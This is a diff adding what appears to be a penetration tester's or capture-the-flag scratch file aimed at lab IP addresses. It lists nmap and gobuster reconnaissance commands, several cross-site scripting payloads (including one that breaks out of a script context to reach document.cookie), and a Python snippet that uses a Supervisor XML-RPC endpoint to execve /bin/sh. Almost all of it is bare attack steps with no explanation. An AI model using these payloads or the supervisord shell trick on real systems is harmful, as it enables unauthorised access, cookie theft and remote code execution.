@@ -1,0 +1,16 @@
+nmap -sTVC 10.129.62.59 -Pn
+gobuster dir  -u http://10.129.62.59/  -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > gobuster.txt
+gobuster dir  -u http://10.129.62.237/weather -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > weather.txt
+gobuster dir  -u http://10.129.62.237/index.html -w /usr/share/dirb/wordlists/common.txt -x txt,php,py,cgi > index.txt
+
+
+<script>alert(1)</script>
+<img src="" onerror>
+"}});alert(document.cookie);//
+
+
+
+from xmlrpclib import ServerProxy
+server = ServerProxy('http://10.129.62.237:9001/RPC2')
+server.supervisor.supervisord.options.execve('/bin/sh', [], {})
+
